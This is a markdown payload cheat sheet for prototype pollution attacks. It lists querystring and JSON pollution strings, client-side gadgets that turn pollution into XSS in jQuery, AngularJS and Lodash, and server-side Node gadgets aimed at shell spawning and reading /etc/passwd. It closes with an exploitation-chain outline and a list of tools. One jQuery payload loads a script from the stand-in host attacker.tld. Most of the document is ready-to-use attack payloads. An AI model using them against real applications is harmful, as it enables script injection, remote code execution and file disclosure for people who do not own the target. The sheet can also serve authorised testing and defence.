# PAYLOADS: Prototype Pollution
## Version: 1.0 | Domain: payloads

---

## CLIENT-SIDE QUERYSTRING
```
?__proto__[admin]=true
?__proto__.admin=true
?constructor[prototype][admin]=true
?constructor.prototype.admin=true
?[__proto__][admin]=true
?["__proto__"]["admin"]=true
```

## JSON BODY
```json
{"__proto__":{"admin":true}}
{"__proto__.admin":true}
{"constructor":{"prototype":{"admin":true}}}
{"a":{"__proto__":{"admin":true}}}
```

## DEEP MERGE GADGET PROBES
```javascript
// Probe in browser console after suspected pollution
console.log({}.admin)
console.log({}.foo)
// If returns true / value → pollution succeeded
```

## CLIENT-SIDE GADGETS (PP → XSS)
```javascript
// jQuery $.get with crossDomain inherited
?__proto__[crossDomain]=true&__proto__[url]=//attacker.tld/xss.js

// AdsBypass — google ads load
?__proto__[head][_owner][stateNode][onclick]=alert(1)

// AngularJS
?__proto__[ngBindHtml]=<img src=x onerror=alert(1)>

// Lodash _.template (versions <4.17.20)
?__proto__[sourceURL]=\\u2028\\u2028alert(1)//

// React via dangerouslySetInnerHTML pollution

// Vue via v-bind options
```

## SERVER-SIDE GADGETS (PP → RCE in Node)
```json
// child_process.spawn via env / shell
{"__proto__":{"shell":"/bin/sh","argv0":"x"}}

// Express render via view options
{"__proto__":{"layout":"/etc/passwd"}}

// Node's process.binding
{"__proto__":{"main":"/etc/passwd"}}

// hbs template engine
{"__proto__":{"main.js":"//../../etc/passwd"}}
```

## EXPLOITATION CHAIN
```bash
# 1. find pollution point (e.g., merge / set / path-set in lodash, jQuery.extend, mongoose ...)
# 2. probe gadget with __proto__[FOO]=1 → check {}.FOO
# 3. find sink that uses inherited prop (CSP src, template engine option, child_process arg)
# 4. craft full chain
```

## TOOLS
- ppmap (Burp ext)
- ppfuzz
- pp-finder
- portswigger DOM Invader

## REFERENCES
PortSwigger PP research (Gareth Heyes), HackTricks PP, ppmap
